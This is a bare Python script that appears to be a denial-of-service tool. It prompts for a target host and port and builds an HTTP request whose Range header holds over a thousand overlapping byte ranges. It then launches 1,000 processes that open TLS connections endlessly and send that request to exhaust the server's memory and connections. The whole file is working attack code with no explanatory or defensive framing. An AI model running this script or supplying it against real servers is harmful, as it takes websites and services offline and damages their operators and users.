import socket, time, multiprocessing, ssl
target_host = input("Host:")
target_port = int(input("Port:"))  # create a socket object 
cliss=[]
rang = "0-1"
for ii in range(0,1326):
  rang = str(rang)+",5-"+str(ii)
request = """GET / HTTP/1.1\r
Range:bytes="""+rang+"""\r
Keep-Alive: timeout=500, max=1000\r
Host:"""+target_host+"""\r\n\r\n"""
def con():
  clis=[]
  a=0
  while True:
    a+=1
    try:
      clis.append(socket.socket(socket.AF_INET, socket.SOCK_STREAM))
      clis[-1]=ssl.wrap_socket(clis[-1], keyfile=None, certfile=None, server_side=False, cert_reqs=ssl.CERT_NONE, ssl_version=ssl.PROTOCOL_SSLv23)
      clis[-1].settimeout(10)
      clis[-1].connect((target_host,target_port))  
      clis[-1].send(request.encode())
    except:
      pass
    if a%20==0:
      m=0
      for x in clis:
        try:
          x.recv(1)
        except:
          clis.pop(m)
        m+=1
m=0
ths=[]
if __name__ == '__main__':
  for x in range(0,1000):
    ths.append(multiprocessing.Process(target=con))
    ths[-1].start()
    if x%10==0:
      print(x)
